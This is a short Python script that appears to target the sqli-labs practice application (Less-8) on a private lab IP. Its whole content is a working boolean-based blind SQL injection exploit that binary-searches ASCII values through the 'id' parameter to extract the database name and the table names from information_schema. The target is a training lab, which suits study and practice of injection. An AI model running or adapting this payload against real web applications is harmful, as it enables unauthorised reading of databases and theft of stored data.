import requests

url = "http://192.168.77.131/master/Less-8/"


def inject_database(url):
    name = ''

    for i in range(1, 100):
        start = 32
        end = 128
        mid = (start + end) // 2
        while start < end:
            # 获取数据库名
            payload_1 = "1' and ascii(substr((select database()),{i},1)) > {mid}-- ".format(i=i, mid=mid)
            # 获取表名
            payload_2 = "1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {i},1)) > {mid}-- ".format(
                i=i, mid=mid)
            params = {"id": payload_2}
            response = requests.get(url, params=params)
            if "You are in..........." in response.text:
                start = mid + 1
            else:
                end = mid
            mid = (start + end) // 2

        if mid == 32:
            break
        name = name + chr(mid)
        print(name)


inject_database(url)
